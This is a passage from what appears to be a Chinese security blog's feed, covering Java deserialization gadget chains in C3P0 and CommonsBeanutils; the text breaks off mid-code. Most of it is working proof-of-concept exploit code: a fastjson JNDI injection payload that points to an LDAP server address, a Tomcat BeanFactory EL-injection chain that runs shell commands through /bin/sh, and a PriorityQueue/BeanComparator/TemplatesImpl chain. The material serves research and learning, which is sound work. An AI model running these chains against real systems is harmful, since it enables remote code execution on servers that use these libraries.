bytes.length;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">            addHexAscii(bytes[i], sw);</span><br><span class="line">        <span class="keyword">return</span> sw.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> out;</span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);</span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;</span><br><span class="line">        sw.write(toHexDigit(h1));</span><br><span class="line">        sw.write(toHexDigit(h2));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p>该条Gadget也是在fastjson，jackson环境中进行利用的，jndi注入适用于jdk8u191以下支持reference情况。</p><p><img src="/2023/06/25/C3P0/1709800498302-81802a40-0dca-49ba-8192-f0d2ac7e9c8c.png"></p><p>com.mchange.v2.c3p0.JndiRefForwardingDataSource#dereference方法会调用javax.naming.InitialContext#lookup方法，当jndiName可控时，可造成JNDI注入。</p><p><img src="/2023/06/25/C3P0/1709801372804-7de2a4d2-c7b7-4db1-a7c5-15e07aa73e94.png"></p><p>com.mchange.v2.c3p0.JndiRefForwardingDataSource#dereference方法在com.mchange.v2.c3p0.JndiRefForwardingDataSource#inner方法中被调用。</p><p><img src="/2023/06/25/C3P0/1709807926026-080ea5d3-db47-4da0-8e4a-0d6e117d37ef.png"></p><p>JndiRefConnectionPoolDataSource类中有属性jndiname及其setter方法，其setter方法会调用内部的JndiRefForwardingDataSource对象的setJndiName方法，改变JndiRefForwardingDataSource#jndiname的值。</p><p><img src="/2023/06/25/C3P0/1709808295746-88d79208-4d06-4670-989f-9574e181459e.png"></p><p><img src="/2023/06/25/C3P0/1709808356463-cc2906bb-2ca2-4d8d-844e-a44d8096a2e1.png"></p><p>此外，JndiRefConnectionPoolDataSource类中有LoginTimeout属性及其setter方法，其setter方法会调用内部WrapperConnectionPoolDataSource对象的setLoginTimeout方法，追踪后会发现来到JndiRefForwardingDataSource#setLoginTimeout，进而调用com.mchange.v2.c3p0.JndiRefForwardingDataSource#inner方法，完成上述利用链。</p><p><img src="/2023/06/25/C3P0/1709808461377-c213cf30-3ad1-4527-9bc9-bfce21699d56.png"></p><p><img src="/2023/06/25/C3P0/1709808515554-3fbfc761-cc37-4008-b5d2-958ffb26c475.png"></p><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>在fastjson，jackson等环境下，调用JndiRefConnectionPoolDataSource类的jndiname，logintimeout属性setter方法，向jndiname传入恶意RMI服务器地址，然后调用logintimeout的setter方法使受害机去lookup设置好的jndiname中的恶意地址，造成JNDI注入。</p><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.c3p0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;jndiName\&quot;:\&quot;ldap://10.6.42.156:8085/NpgoGBfd\&quot;,\&quot;LoginTimeout\&quot;:\&quot;1\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="不出网利用"><a href="#不出网利用" class="headerlink" title="不出网利用"></a>不出网利用</h2><p>不论是URLClassLoader加载远程类，还是JNDI注入，都需要目标机器能够出网，而HEX序列化字节加载器反序列化的利用方式虽然不用出网，但却需要有Fastjson、Jackson等相关依赖。</p><p>在JNDI高版本利用中，可以加载本地的Factory类进行攻击，而利用条件之一就是该工厂类至少存在一个getObjectInstance方法，例如通过加载Tomcat8中的org.apache.naming.factory.BeanFactory进行EL表达式注入。</p><p>在URLClassLoader远程类加载利用方式中，当实例化完恶意类后，会调用ObjectFactory#getObjectInstance。由于可以实例化任意类，所以可以将该类设置为本地的BeanFactory类，当存在Tomcat8相关依赖环境时，可以进行EL表达式注入，利用方式类似JNDI的高版本绕过。</p><p><img src="/2023/06/25/C3P0/1709811010187-e40fe2f7-e06c-4a5c-b176-9f575ef049ab.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.c3p0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatELBypass</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        setFieldValue(poolBackedDataSourceBase, <span class="string">&quot;connectionPoolDataSource&quot;</span>, <span class="keyword">new</span> <span class="title class_">EvilReference</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(poolBackedDataSourceBase);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EvilReference</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator&quot;</span>;</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;&quot;</span>+ cmd +<span class="string">&quot;&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> ref;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsBeanutils</title>
      <link href="/2023/05/24/CommonsBeanutils/"/>
      <url>/2023/05/24/CommonsBeanutils/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CommonsBeanutils是Apache提供的一个用于操作JavaBean的工具包。在之前学习CC链的时候，CC2的利用链为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue -&gt; TransformingComparator -&gt; ChainedTransformer -&gt; InstantiateTransformer -&gt; TemplatesImpl</span><br></pre></td></tr></table></figure><p><font style="color:rgb(0, 0, 0);">CommonsBeanutils</font><font style="color:rgb(0, 0, 0);">链的主要目的就是绕过中间由</font><font style="color:rgb(0, 0, 0);">TransformingComparator</font><font style="color:rgb(0, 0, 0);">触发</font><font style="color:rgb(0, 0, 0);">ChainedTransformer</font><font style="color:rgb(0, 0, 0);">来实例化</font><font style="color:rgb(0, 0, 0);">TemplatesImpl</font><font style="color:rgb(0, 0, 0);">的过程，直接利用</font><font style="color:rgb(0, 0, 0);">Comparator</font><font style="color:rgb(0, 0, 0);">来实例化</font><font style="color:rgb(0, 0, 0);">TemplatesImpl</font><font style="color:rgb(0, 0, 0);">。</font></p><p>JavaBean是一种JAVA语言写成的可重用组件，是一个符合如下标准的类：</p><ol><li>类是公共的</li><li>有一个无参的构造器</li><li>有私有属性，其必须有对应的get&#x2F;set方法去设置属性</li><li>对于Boolean类型的成员变量，必须用is替代get&#x2F;set方法</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> child;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.age; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123; <span class="built_in">this</span>.age = age; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isChild</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age &lt;= <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依赖版本为commons-beanutils 1.9.2和commons-collections 2.0-3.2.2。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="PropertyUtils"><a href="#PropertyUtils" class="headerlink" title="PropertyUtils"></a>PropertyUtils</h3><p>org.apache.commons.beanutils.PropertyUtils类使用Java反射API来调用Java对象上的通用属性getter和setter操作的实用方法，这些方法的具体使用逻辑其实是由org.apache.commons.beanutils.PropertyUtilsBean来实现的。</p><p>PropertyUtils中有个共有静态方法getProperty，接收类对象bean和属性名name，方法会返回这个类的这个属性的值。类似于一个Field的反射工具类，不过不是直接使用反射取值，而是使用反射调用其getter方法取值。结合可以触发getter方法这个特点，不难想到可以通过触发TemplatesImpl的getOutputProperties方法来构造调用链。</p><p><img src="/2023/05/24/CommonsBeanutils/1709260153250-fafad5e8-8b3d-4e45-bbd0-1cc1956e82f8.png"></p><h3 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h3><p>BeanComparator是commons-beanutils提供的用来比较两个JavaBean是否相等的类，其实现了java.util.Comparator接口。BeanComparator在初始化时可以指定property属性名称和comparator对比器，如果不指定，则默认是ComparableComparator。</p><p><img src="/2023/05/24/CommonsBeanutils/1709260343702-575f5e3f-8501-4b2f-9851-6e2b7a5fe785.png"></p><p>BeanComparator的compare方法接收两个对象，分别调用PropertyUtils#getProperty方法获取两个对象的property属性的值，然后调用internalCompare方法调用实例化时初始化的comparator的compare方法进行比较。</p><p><img src="/2023/05/24/CommonsBeanutils/1709260428377-d6c96580-64f8-4b51-8fc6-e6eaf283caef.png"></p><h2 id="构造利用"><a href="#构造利用" class="headerlink" title="构造利用"></a>构造利用</h2><p>PriorityQueue反序列化时调用BeanComparator的compare方法，compare方法中o1赋值构造好的templates对象，property赋值为TemplatesImpl的outputProperties属性，调用TemplatesImpl#getOutputProperties方法，接着衔接TemplatesImpl的利用链 ，触发恶意类的实例化。</p><p>但是BeanComparator在初始化时不指定comparator时，默认使用的ComparableComparator类是存在于CommonsCollections库中的，那么能否找到一个不依赖CommonsCollections库的方式来触发呢？</p><p>解决方案也是很简单的，上午提到了，使用ComparableComparator类的时候是因为初始化时没有指定comparator，那如果在初始化时赋予一个在原生JDK或CommonsBeanutils库中存在的Comparator并且实现了Serializable接口的类，便可以解决该问题。常用的有java.util.Collections$ReverseComparator和java.lang.String$CaseInsensitiveComparator。</p><p><img src="/2023/05/24/CommonsBeanutils/1709269563488-7510dbd4-b6ee-471d-a309-ef8a65f61d63.png"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ul><li>依赖CommonsCollections</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.commonsbeanutils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.example.deserialize.commonscollections.Evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutilsCC</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] objects = (Object[]) field.get(queue);</span><br><span class="line">        objects[<span class="number">0</span>] = getTemplates();</span><br><span class="line"></span><br><span class="line">        BeanComparator&lt;Object&gt; beanComparator = <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;comparator&quot;</span>, beanComparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Templates <span class="title function_">getTemplates</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Evil.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title 